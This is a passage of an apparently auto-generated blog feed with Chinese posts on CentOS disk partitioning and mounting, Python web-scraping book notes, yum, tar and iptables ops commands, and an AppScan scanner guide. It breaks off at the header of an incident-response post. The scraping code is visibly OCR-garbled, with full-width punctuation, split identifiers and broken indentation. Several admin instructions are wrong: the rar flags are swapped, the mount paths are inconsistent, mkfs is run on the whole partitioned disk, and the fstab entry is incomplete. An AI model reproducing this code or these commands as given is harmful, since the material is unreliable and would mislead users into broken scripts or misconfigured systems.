    <link href="http://yoursite.com/2018/08/26/%E2%80%9Ccentos7-%E5%88%9D%E5%A7%8B%E5%8C%96%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E3%80%81%E6%8C%82%E8%BD%BD/"/>
    <id>http://yoursite.com/2018/08/26/“centos7-初始化硬盘分区、挂载/</id>
    <published>2018-08-26T13:30:05.000Z</published>
    <updated>2018-08-26T14:57:37.988Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-135.png" alt="upload successful"></p><h2 id="linux硬盘知识："><a href="#linux硬盘知识：" class="headerlink" title="linux硬盘知识："></a>linux硬盘知识：</h2><p>linux下硬盘设备名为（IDE硬盘为hdx（x为从a—d）因为IDE硬盘最多四个，SCSI，SATA，USB硬盘为sdx（x为a—z）），硬盘主分区最多为4个.所以主分区从sdb1开始到sdb4，其中sdb4为扩展分区，逻辑分区从sdb5开始，（逻辑分区永远从sdb5开始…）设备名可以使用fdisk –l查看</p><h2 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h2><h4 id="1-查看新增磁盘信息"><a href="#1-查看新增磁盘信息" class="headerlink" title="1.查看新增磁盘信息"></a>1.查看新增磁盘信息</h4><p> <code>lsblk</code></p><p><img src="\images\pasted-137.png" alt="upload successful"></p><h4 id="2-查看分区信息"><a href="#2-查看分区信息" class="headerlink" title="2.查看分区信息"></a>2.查看分区信息</h4><p><code>fdisk -l</code></p><p><img src="\images\pasted-138.png" alt="upload successful"></p><h4 id="3-将sdb分区，键入m获取帮助"><a href="#3-将sdb分区，键入m获取帮助" class="headerlink" title="3.将sdb分区，键入m获取帮助"></a>3.将sdb分区，键入m获取帮助</h4><p><img src="\images\pasted-139.png" alt="upload successful"></p><h4 id="4-键入n添加新的分区"><a href="#4-键入n添加新的分区" class="headerlink" title="4.键入n添加新的分区"></a>4.键入n添加新的分区</h4><p>p表示主分区，e表示扩展分区</p><p><img src="\images\pasted-140.png" alt="upload successful"></p><h4 id="5-创建主分区"><a href="#5-创建主分区" class="headerlink" title="5.创建主分区"></a>5.创建主分区</h4><p><img src="\images\pasted-141.png" alt="upload successful"><br>第一条红框处按回车就好了，第二条红框处，我想设2G的一个空间，键入+2G</p><p>继续设置第二个主分区大小2G，第三个主分区大小3G</p><p><img src="\images\pasted-142.png" alt="upload successful"></p><h4 id="6-创建扩展分区"><a href="#6-创建扩展分区" class="headerlink" title="6.创建扩展分区"></a>6.创建扩展分区</h4><p>创建第四个分区为扩展分区</p><p><img src="\images\pasted-143.png" alt="upload successful"></p><h4 id="7-创建逻辑分区"><a href="#7-创建逻辑分区" class="headerlink" title="7.创建逻辑分区"></a>7.创建逻辑分区</h4><p>创建第五个分区为逻辑分区</p><p><img src="\images\pasted-144.png" alt="upload successful"><br>完成后一定要w进行写入磁盘并退出，否则上面的操作将白费</p><p><img src="\images\pasted-145.png" alt="upload successful"></p><h2 id="对分区操作"><a href="#对分区操作" class="headerlink" title="对分区操作"></a>对分区操作</h2><h4 id="1-查看分区情况"><a href="#1-查看分区情况" class="headerlink" title="1.查看分区情况"></a>1.查看分区情况</h4><p><img src="\images\pasted-146.png" alt="upload successful"></p><h4 id="2-删除分区"><a href="#2-删除分区" class="headerlink" title="2.删除分区"></a>2.删除分区</h4><p>删除分区5即逻辑分区</p><p><img src="\images\pasted-147.png" alt="upload successful"></p><h4 id="3-格式化分区"><a href="#3-格式化分区" class="headerlink" title="3.格式化分区"></a>3.格式化分区</h4><p>首先查看文件类型  df -hT<br><code>mkfs -t ext4 /dev/sdb</code></p><p><img src="\images\pasted-148.png" alt="upload successful"></p><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><h4 id="临时挂载"><a href="#临时挂载" class="headerlink" title="临时挂载"></a>临时挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/gz</span><br><span class="line">mount /dev/sdb /data/gz</span><br><span class="line">df -hT</span><br></pre></td></tr></table></figure><p><img src="\images\pasted-150.png" alt="upload successful"><br>取消挂载就是umount<br>这种方式只临时挂载到/opt目录下，下次开机时不会自动挂载<br>注意：挂载后/opt目录下的文件会被临时删除，注意备份</p><h4 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h4><p>1.查询磁盘分区的UUID    <code>blkid /dev/sdb</code></p><p><img src="\images\pasted-149.png" alt="upload successful"></p><p>2.通过vim编辑<code>vim /etc/fstab/</code><br><code>UUID=870d929c-dbce-40c8-9e9e-f1933a6f422c /data/gz ext4</code><br>保存<br>3.重启，查看 <code>df-hT</code></p><p><img src="\images\pasted-151.png" alt="upload successful"><br>自动挂载成功</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>用python写网络爬虫</title>
    <link href="http://yoursite.com/2018/08/26/%E7%94%A8python%E5%86%99%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2018/08/26/用python写网络爬虫/</id>
    <published>2018-08-26T06:32:29.000Z</published>
    <updated>2018-08-26T13:42:24.503Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="第一章-网络爬虫简介"><a href="#第一章-网络爬虫简介" class="headerlink" title="第一章-网络爬虫简介"></a>第一章-网络爬虫简介</h1><h4 id="爬虫是否合法"><a href="#爬虫是否合法" class="headerlink" title="爬虫是否合法"></a>爬虫是否合法</h4><p>当抓 取的数据是现实生活中的真实数据（比如，营业地址、 电话清 单） 时， 是允许转载的。 但是， 如果是原创数据 （比如， 意见和评论）， 通常就会受到版权限制， 而不能转载</p><h4 id="爬虫的便利"><a href="#爬虫的便利" class="headerlink" title="爬虫的便利"></a>爬虫的便利</h4><p>重复的手工可以用爬虫的自动化实现</p><h4 id="检查robots-txt"><a href="#检查robots-txt" class="headerlink" title="检查robots.txt"></a>检查robots.txt</h4><p>大多数网站 都会定义robots.txt文件， 这样可以让爬虫了解爬取该网站时存在哪些限制</p><h4 id="检查网站地图"><a href="#检查网站地图" class="headerlink" title="检查网站地图"></a>检查网站地图</h4><p>网站提供的Sitemap 文件 （即网 站 地图） 可以帮助爬虫定位网 站 最新的内 容，而无须爬 取每 一 个网页</p><h4 id="估算网站大小"><a href="#估算网站大小" class="headerlink" title="估算网站大小"></a>估算网站大小</h4><p>我们可以通过Goo gle搜索 的s ite 关键词过滤域名结果， 从而获取该 信息。 我们可以从 htt p: //www. google.<br>com/adva口ced search 了解到该 接口及其他高级搜索 参数的用法。</p><p>使用site 关键词对示例网 站 进行 搜索 的结果， 即在Goo g le中 搜索 s ite: exam ple. webscra ping. com</p><h4 id="识别网站所用技术"><a href="#识别网站所用技术" class="headerlink" title="识别网站所用技术"></a>识别网站所用技术</h4><p>builtwith 模块。 该模块的安装方法如下：</p><p>pip   install  builtwith</p><p>如何使用：</p><p>import builtwith</p><p>builtwith . parse （ ’ http : / /exaple . webscraping . com ’ ｝</p><h4 id="寻找网站所有者"><a href="#寻找网站所有者" class="headerlink" title="寻找网站所有者"></a>寻找网站所有者</h4><p>我们可以使用WHOIS协议查询域名的注册者是谁. Pyton中有一个针对该协议的封装库，其文档地址为 https: // pypi. python.org/ pypi/ python-whois ， 我们可以通过 pip进行安装。</p><p>pip install python-whois</p><p>import  whois</p><p>print  whois . whois (‘appspt . com’)</p><h4 id="编写第一个网络爬虫"><a href="#编写第一个网络爬虫" class="headerlink" title="编写第一个网络爬虫"></a>编写第一个网络爬虫</h4><h5 id="下载网页"><a href="#下载网页" class="headerlink" title="下载网页"></a>下载网页</h5><p>使用Python的urllib 2 模块下载URL。</p><p>import   urllib2<br>def   download (url ) :<br>            return   urllib2.url .open ( url ).read ( )</p><h5 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h5><p>import  urllib2</p><p>def  download(url):</p><pre><code>print &apos;downloading......&apos;,urltry:     html = urllib2.urlopen(url).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = nonereturn html</code></pre><p>当出现下载错误时， 该函数能够捕获到异常， 然后返回 None</p><h5 id="重试下载"><a href="#重试下载" class="headerlink" title="重试下载"></a>重试下载</h5><p>4xx错误发生在请求存在问题时，而5xx 错误则发生在服务端存在问题时。 所以,我们只需要确保download函数在发生5xx错误时重试下载即可</p><p>import  urllib2</p><p>def  download(url , num_retries = 2 ):</p><pre><code>print &apos;downloading......&apos;,urltry:     html = urllib2.urlopen(url).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = none     if   num_retries &gt; 0:           if   hasattr ( e ， ’ code ’ ） and  500 &lt;=  e . code &lt; 600:           return  download ( url , num_retries - 1 ) return   html</code></pre><h5 id="用户代理"><a href="#用户代理" class="headerlink" title="用户代理"></a>用户代理</h5><p>为避免网站有反爬技术，我们需要加上请求头以模仿浏览器请求</p><p>import  urllib2</p><p>def  download(url , num_retries = 2 ):</p><pre><code>print &apos;downloading......&apos;,url headers={&apos;user-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;} request = urllib2 . Request ( url , headers =headers )try:     html = urllib2.urlopen(request).read()except  urllib2.URLError as  e:     print  &apos;download  error:&apos; , e\.reason     html = none     if   num_retries &gt; 0:           if   hasattr ( e ， ’ code ’ ） and  500 &lt;=  e . code &lt; 600:           return  download ( url , num_retries - 1 ) return   html</code></pre><h1 id="第二章-数据抓取"><a href="#第二章-数据抓取" class="headerlink" title="第二章-数据抓取"></a>第二章-数据抓取</h1><h3 id="三种网页抓取方法"><a href="#三种网页抓取方法" class="headerlink" title="三种网页抓取方法"></a>三种网页抓取方法</h3><p>首先是正则表达式 ， 然后是流行的BeautifulSoup 模块 ， 最后是强大的lxml模块</p><p>示例网站为：<a href="http://example.webscraping.com" target="_blank" rel="noopener">http://example.webscraping.com</a></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>当我们使用正则表达式抓取面积数据 时 ， 首 先需要尝试匹配＜td&gt;元素中的内容 ， 如下所 示</p><p>import re</p><p>url ＝ ‘<a href="http://example" target="_blank" rel="noopener">http://example</a> . webscraping.com/places/view/United Kingdom239’</p><p>html = download (url )</p><p>re.findall （ ’＜ td class＝”w2p fw ” ＞ ( . * ? ) &lt;/td＞ ’ ， html )</p><p>从上述结果 中 可 以看 出 ， 多个国 家属性都使用 了＜td c l a s s = “ w2p fw “ &gt;标签 。 要想分离出 面积属性 ，我们可以只选择其中的第二个元素</p><p>re .findall （ ’ ＜td c l a s s ＝ ” w2p fw ” ＞ （.*?） ＜ ／ td＞ ’ ， html ) [ 1 ]</p><p>虽然现在可以使用 这个方案 ， 但是如果网页发生变化 ， 该方案很可能就会失效</p><h4 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h4><p>Beautiful Soup 是一个非常流行 的 Pyhon 模块 。 该模块可以解析网 页 ， 并提供定位内容的便捷接口 。 如果你还没有安装该模块 ， 可 以使用下面的命令安装其最新版本 ：</p><p>pip install   beautifulsoup4</p><p>使用 Beautifl Soup 的第一步是将 己下 载 的 HTML 内 容解析为 soup 文档</p><p>from bs4 import  BeautifulSoup</p><p> html ＝ ’ ＜u l c l a s s =country&gt;&lt; l i &gt;Area&lt; l i &gt; Population&lt; /ul＞ ’</p><p>soup = BeautifulSoup （html ， ’ html .parser’ ）</p><p>BeautifulSoup 能够正确解析缺失 的引号并闭合标签, 现在可 以使用find()和find_all()方法来定位需要的元素了</p><p>u l = soup.find（ ’ ul ’ ， attrs＝ ｛ ’ class ’ ： ’ country ’ ｝ ）</p><p>ul.find（’ l i ’）  # 只匹配第一个符合的</p><p>ul.find_all（’ l i ’）  # 匹配所有符合的</p><p>使用该方法抽取示例国家面积数据的完整代码 </p><p>from bs4 import Beautiful Soup<br> url ＝ ‘<a href="http://example" target="_blank" rel="noopener">http://example</a> . webscraping.com/places/view/United Kingdom239’<br> html = download (url )<br>soup = Beautifulsoup(html)</p><p> tr = soup.find ( attrs＝｛ ‘id’: ‘places_area_row ’｝）<br> td = tr.find (attrs ＝ ｛ ’ cl a s s ’ ： ’ w2p_fw ’))      # locate the area tag<br> area = td.text                            # extract the text from this tag<br> print area<br>244,82 0 quare kilometres</p><h4 id="Lxml"><a href="#Lxml" class="headerlink" title="Lxml"></a>Lxml</h4><p>Lxml 是基于libxml 2这一 XML 解析库的Python封装 。 该模块使用C语言编写 ， 解析速度比Beautifl Soup更快，不过安装过程也更为复杂</p><p>和 Beautifl Soup 一样 ， 使用 lxml 模块 的第一步也是将有可能不合法 的HTML 解析为 统一格式,同样地, lxml 也可以正确解析属性两侧缺失的引号,并闭合标签</p><p>解析完输入 内 容之后 ， 进入选择元素 的步骤 ， 此 时 l xml 有几种不 同 的方法 ， 比如 XPath 选择器和Beautifl Soup 的find()方法.  我们将会使用 css 选择器 ， 因 为它更加 简 沽</p><p>使用lxml 的 css 选择器抽取面积数据 的 示例</p><p>import   lxml.html</p><p>tree = lxml.html.fromstring(html )</p><p>td = tree.cssselect ( ’ tr#places_area_r。w &gt; td . w2p_fw ’) [0]</p><p>area = td.text content()</p><p>print area</p><p>这段代码首先会找 到 ID 为place s area row 的表格行元素 ， 然后选择class为 w2pfw 的表格数据子标签</p><h5 id="css-选择器"><a href="#css-选择器" class="headerlink" title="css 选择器"></a>css 选择器</h5><p>css 选择器表示选择元素所使用的模式</p><p>选择所 有标签 ： ＊<br>选择＜a＞标 签： a<br>选择所有 cla s s ＝ ”lin k ” 的 元 素 ： .lin k<br>选择 cla s s ＝ ”link ” 的 ＜a＞标 签： a.link<br>选择 id= “ home ” 的 ＜a＞标 签： a #home<br>选择父 元 素 为 ＜a＞标 签 的 所 有 ＜ span＞子标 签： a &gt; span<br>选择＜a＞标签 内 部 的 所 有 &lt; span＞标签： a  span<br>选择 title 属 性 为 ” Home ” 的 所 有＜a＞标 签： a [ title=Home ]</p><p>lxml在内部实现 中 ， 实 际 是将 css 选择器转换为等价的 XPath 选择器</p><h4 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h4><p>每种抓取方法 的优缺点:</p><p>抓取方法                    性能          使用难度               安装难度<br>正则表达式                  快              困难                     简单 （ 内 置模块 ）<br>Beautifl Soup             慢              简单                      简单 （ 纯 P归hon )<br>Lxml                            快              简单                      相对困难</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>运维知识</title>
    <link href="http://yoursite.com/2018/08/25/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/25/运维知识/</id>
    <published>2018-08-25T14:39:05.000Z</published>
    <updated>2018-08-28T04:02:06.184Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-173.png" alt="upload successful"></p><h2 id="配置本地yum源"><a href="#配置本地yum源" class="headerlink" title="配置本地yum源"></a>配置本地yum源</h2><p>vim /etc/yum.repos.d/rhel7.repo</p><p>[rhel7]</p><p>name=rhel7</p><p>baseurl=file:///media/cdrom</p><p>enabled=1</p><p>gpgcheck=0</p><p>创建挂载点进行挂载，设置开机自动挂载。</p><p>mkdir -p /media/cdrom</p><p>mount /dev/cdrom /media/cdrom</p><p>挂载本地iso文件</p><p> 1.上传iso文件到/opt  </p><p>2.创建挂载目录</p><p>mkdir /media/CentOS7</p><p>3.挂载iso文件</p><p>mount -t iso9660 -o loop /opt/CentOS-7-x86_64-DVD-1511_7.2.iso /media/CentOS7/</p><p>4.配置源</p><p>执行 vi /etc/yum.repos.d/CentOS7-Localsource.repo #打开repo文件，如果这一文件不存在则被创建<br>按a 进入编辑模式<br>输入以下内容：<br>[CentOS7-Localsource]<br>name=CentOS7<br>baseurl=file:///media/CentOS7<br>enabled=1<br>gpgcheck=0</p><p>按ESC退出编辑 输入 :x 再回车 保存后退出</p><p>5.将此文件/etc/yum.repos.d/CentOS-Base.repo备份掉，或者移动到别的目录下</p><p>6.生成本地yum缓存 执行</p><p>yum  clean all(清除缓存)</p><p>yum makecache(建立新缓存)</p><p>7.测试是否生效</p><p>yum install telnet</p><p>8.卸载挂载的镜像文件</p><p>umount  /media/CentOS7</p><h2 id="Linux下打包和解压缩"><a href="#Linux下打包和解压缩" class="headerlink" title="Linux下打包和解压缩"></a>Linux下打包和解压缩</h2><h4 id="各种解压缩命令"><a href="#各种解压缩命令" class="headerlink" title="各种解压缩命令"></a>各种解压缩命令</h4><p>.tar<br>压缩：tar cvf FileName.tar FileName</p><p>解压：tar xvf FileName.tar</p><p>.gz<br>解压1：gunzip FileName.gz<br>解压2：gzip -d FileName.gz<br>压缩：gzip FileName </p><p>.tar.gz<br>解压：tar zxvf FileName.tar.gz </p><p>压缩：tar zcvf FileName.tar.gz DirName </p><p>.bz2<br>解压1：bzip2 -d FileName.bz2<br>解压2：bunzip2 FileName.bz2<br>压缩： bzip2 -z FileName </p><p>.tar.bz2<br>解压：tar jxvf FileName.tar.bz2 </p><p>压缩：tar jcvf FileName.tar.bz2 DirName </p><p>.bz<br>解压1：bzip2 -d FileName.bz<br>解压2：bunzip2 FileName.bz<br>压缩：未知 </p><p>.tar.bz<br>解压：tar jxvf FileName.tar.bz </p><p>压缩：未知 </p><p>.Z<br>解压：uncompress FileName.Z<br>压缩：compress FileName </p><p>.tar.Z<br>解压：tar Zxvf FileName.tar.Z </p><p>压缩：tar Zcvf FileName.tar.Z DirName </p><p>.tgz<br>解压：tar zxvf FileName.tgz<br>压缩：未知 </p><p>.tar.tgz<br>解压：tar zxvf FileName.tar.tgz </p><p>压缩：tar zcvf FileName.tar.tgz FileName </p><p>.zip<br>解压：unzip FileName.zip </p><p>压缩：zip FileName.zip DirName </p><p>.rar<br>解压：rar a FileName.rar<br>压缩：rar e FileName.rar </p><h4 id="不同后缀的含义："><a href="#不同后缀的含义：" class="headerlink" title="不同后缀的含义："></a>不同后缀的含义：</h4><pre><code>.tar打包格式：tar程序打包的数据，并没有压缩过.z格式：compress程序压缩的文件.gz压缩格式：gzip程序压缩的文件 .bz2压缩格式：bzip2程序压缩的文件.tar.gz打包压缩：tar程序打包的文件，其中并且经过 gzip 的压缩.tar.bz2打包压缩：tar程序打包的文件，其中并且经过 bzip2 的压缩</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>CentOS7默认的防火墙不是iptables,而是firewalld.<br>安装iptable iptable-service</p><h5 id="先检查是否安装了iptables"><a href="#先检查是否安装了iptables" class="headerlink" title="#先检查是否安装了iptables"></a>#先检查是否安装了iptables</h5><p>service iptables status</p><p>#安装iptables<br>yum install -y iptables</p><p>#升级iptables<br>yum update iptables </p><p>#安装iptables-services<br>yum install iptables-services</p><h5 id="禁用-停止自带的firewalld服务"><a href="#禁用-停止自带的firewalld服务" class="headerlink" title="禁用/停止自带的firewalld服务"></a>禁用/停止自带的firewalld服务</h5><p>#停止firewalld服务<br>systemctl stop firewalld</p><p>#禁用firewalld服务<br>systemctl mask firewalld<br>设置现有规则</p><h5 id="查看iptables现有规则"><a href="#查看iptables现有规则" class="headerlink" title="#查看iptables现有规则"></a>#查看iptables现有规则</h5><p>iptables -L -n</p><p>#先允许所有,不然有可能会杯具<br>iptables -P INPUT ACCEPT</p><p>#清空所有默认规则<br>iptables -F</p><p>#清空所有自定义规则<br>iptables -X</p><p>#所有计数器归0<br>iptables -Z</p><p>#允许来自于lo接口的数据包(本地访问)<br>iptables -A INPUT -i lo -j ACCEPT</p><h5 id="开放22端口"><a href="#开放22端口" class="headerlink" title="#开放22端口"></a>#开放22端口</h5><p>iptables -A INPUT -p tcp –dport 22 -j ACCEPT</p><p>#开放21端口(FTP)<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT</p><p>#开放80端口(HTTP)<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT</p><p>#开放443端口(HTTPS)<br>iptables -A INPUT -p tcp –dport 443 -j ACCEPT</p><p>#允许ping<br>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT</p><p>#允许接受本机请求之后的返回数据 RELATED,是为FTP设置的<br>iptables -A INPUT -m state –state  RELATED,ESTABLISHED -j ACCEPT</p><p>#其他入站一律丢弃<br>iptables -P INPUT DROP</p><p>#所有出站一律绿灯<br>iptables -P OUTPUT ACCEPT</p><p>#所有转发一律丢弃<br>iptables -P FORWARD DROP</p><h5 id="其他规则设定"><a href="#其他规则设定" class="headerlink" title="其他规则设定"></a>其他规则设定</h5><p>#如果要添加内网ip信任（接受其所有TCP请求）<br>iptables -A INPUT -p tcp -s 45.96.174.68 -j ACCEPT</p><p>#过滤所有非以上规则的请求<br>iptables -P INPUT DROP</p><p>#要封停一个IP，使用下面这条命令：<br>iptables -I INPUT -s <strong><em>.</em></strong>.<strong><em>.</em></strong> -j DROP</p><p>#要解封一个IP，使用下面这条命令:<br>iptables -D INPUT -s <strong><em>.</em></strong>.<strong><em>.</em></strong> -j DROP</p><h5 id="保存规则设定"><a href="#保存规则设定" class="headerlink" title="保存规则设定"></a>保存规则设定</h5><p>#保存上述规则<br>service iptables save<br>开启iptables服务 </p><p>##### </p><h5 id="注册iptables服务"><a href="#注册iptables服务" class="headerlink" title="#注册iptables服务"></a>#注册iptables服务</h5><p>#相当于以前的chkconfig iptables on<br>systemctl enable iptables.service</p><p>#开启服务<br>systemctl start iptables.service</p><p>#查看状态<br>systemctl status iptables.service</p><p>解决vsftpd在iptables开启后,无法使用被动模式的问题<br>1.首先在/etc/sysconfig/iptables-config中修改或者添加以下内容</p><p>#添加以下内容,注意顺序不能调换<br>IPTABLES_MODULES=”ip_conntrack_ftp”<br>IPTABLES_MODULES=”ip_nat_ftp”<br>2.重新设置iptables设置<br>iptables -A INPUT -m state –state  RELATED,ESTABLISHED -j ACCEPT</p><h5 id="以下为完整设置脚本"><a href="#以下为完整设置脚本" class="headerlink" title="以下为完整设置脚本"></a>以下为完整设置脚本</h5><p>#!/bin/sh<br>iptables -P INPUT ACCEPT<br>iptables -F<br>iptables -X<br>iptables -Z<br>iptables -A INPUT -i lo -j ACCEPT<br>iptables -A INPUT -p tcp –dport 22 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 443 -j ACCEPT<br>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT<br>iptables -A INPUT -m state –state RELATED,ESTABLISHED -j ACCEPT<br>iptables -P INPUT DROP<br>iptables -P OUTPUT ACCEPT<br>iptables -P FORWARD DROP<br>service iptables save<br>systemctl restart iptables.service</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Appscan使用指北</title>
    <link href="http://yoursite.com/2018/08/23/Appscan%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/23/Appscan使用指北/</id>
    <published>2018-08-23T13:45:05.000Z</published>
    <updated>2018-08-23T15:18:31.684Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-115.png" alt="upload successful"></p><h2 id="关于Appscan"><a href="#关于Appscan" class="headerlink" title="关于Appscan"></a>关于Appscan</h2><p>Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan  source edition，到针对 Web 应用进行快速扫描的 AppScan    standard edition，以及进行安全管理和汇总整合的 AppScan     enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的AppScan，即 AppScan standard edition。其安装在Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试</p><h2 id="AppScan工作原理"><a href="#AppScan工作原理" class="headerlink" title="AppScan工作原理"></a>AppScan工作原理</h2><p><img src="\images\pasted-117.png" alt="upload successful"></p><p>1.通过搜索（爬行）发现整个 Web 应用结构</p><p>2.根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库）</p><p>3.通过对于 Respone 的分析验证是否存在安全漏洞</p><h4 id="扫描原理"><a href="#扫描原理" class="headerlink" title="扫描原理"></a>扫描原理</h4><p>扫描规则库 + 爬行 + 测试</p><p><img src="\images\pasted-116.png" alt="upload successful"></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h4 id="常规扫描"><a href="#常规扫描" class="headerlink" title="常规扫描"></a>常规扫描</h4><p>下一步——下一步。。</p><p>1.打开 AppScan.exe 选择 文件</p><p>2.选择常规扫描（扫描规则自己可以定义后面详细说明）下一步</p><p><img src="\images\pasted-119.png" alt="upload successful"></p><p>3.输入你要扫描的起始 url，然后下一步</p><h4 id="登录扫描"><a href="#登录扫描" class="headerlink" title="登录扫描"></a>登录扫描</h4><p>如果选择记录此项后,会出现一个新的浏览器，并尝试链接到指定的网站作为本扫描的起始 URL.你需要输入账号和密码登陆到应用程序.这样设置之后你可以关闭浏览器，但是不要点击注销按钮.</p><p>更改浏览器：Tools–&gt;Options –&gt;Advanced  OpenIEBrower 的值 0–Appscan浏览器,1–IE,2–Firefox,3–Chrome.<br>如果选择提示，每次注销之后,Appscan 会提示你登陆到应用程序中.如果你打算整个扫描你的系统，你可以选择这个选项</p><p><img src="\images\pasted-118.png" alt="upload successful"><br>如果遇到没有验证码的登录页面可以选择自动选择下一步</p><h4 id="测试策略"><a href="#测试策略" class="headerlink" title="测试策略"></a>测试策略</h4><p>根据你的测试策略,你需要选择最适合你需求的策略,现有的策略都是默认（缺省）的</p><p><img src="\images\pasted-120.png" alt="upload successful"><br>这是开始扫描的最后一步.IBM Rational Appscan 允许你选择你想要的扫描方式，即完成扫描,探索扫描等</p><p><img src="\images\pasted-121.png" alt="upload successful"></p><h2 id="AppScan-简单配置"><a href="#AppScan-简单配置" class="headerlink" title="AppScan-简单配置"></a>AppScan-简单配置</h2><h4 id="配置面板"><a href="#配置面板" class="headerlink" title="配置面板"></a>配置面板</h4><p>点击 appscan 的配置选项即可打开配置面板，里面的参数可以根据自己实际情况修改</p><p><img src="\images\pasted-122.png" alt="upload successful"></p><h4 id="排除文件路径"><a href="#排除文件路径" class="headerlink" title="排除文件路径"></a>排除文件路径</h4><p><img src="\images\pasted-123.png" alt="upload successful"></p><h4 id="探索选项"><a href="#探索选项" class="headerlink" title="探索选项"></a>探索选项</h4><p><img src="\images\pasted-124.png" alt="upload successful"></p><h4 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h4><p><img src="\images\pasted-125.png" alt="upload successful"></p><h4 id="扫描策略"><a href="#扫描策略" class="headerlink" title="扫描策略"></a>扫描策略</h4><p>可以根据网站条件修改 为加快网站扫描速度 可以去掉不重要的漏洞扫描</p><h4 id="配置总结"><a href="#配置总结" class="headerlink" title="配置总结"></a>配置总结</h4><p>对于大型的网站，我们可以从几个方面来优化配置：</p><p>1.选择合适的，最小化的扫描规则</p><p>2.分解扫描任务，把一个大的扫描任务分解为多个小的扫描任务</p><p>3.根据页面特点，设置可以过滤的类似页面（冗余页面）</p><h2 id="扩展工具"><a href="#扩展工具" class="headerlink" title="扩展工具"></a>扩展工具</h2><p><img src="\images\pasted-126.png" alt="upload successful"></p><p>表单破解</p><p><img src="\images\pasted-127.png" alt="upload successful"><br>链接测试</p><p><img src="\images\pasted-128.png" alt="upload successful"><br>编码转换</p><p><img src="\images\pasted-129.png" alt="upload successful"><br>正则测试、</p><p><img src="\images\pasted-130.png" alt="upload successful"><br>发包测试</p><p><img src="\images\pasted-131.png" alt="upload successful"><br>会话令牌分析</p><p><img src="\images\pasted-132.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>应急响应手工杀马</title>
    <link href="http://yoursite.com/2018/08/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%B7%A5%E6%9D%80%E9%A9%AC/"/>
    <id>http://yoursite.com/2018/08/22/应急响应手工杀马/</id>
    <published>2018-08-22T07:05:42.000Z</published>
    <updated>2018-08-22T12:25:41.450Z</updated>
    
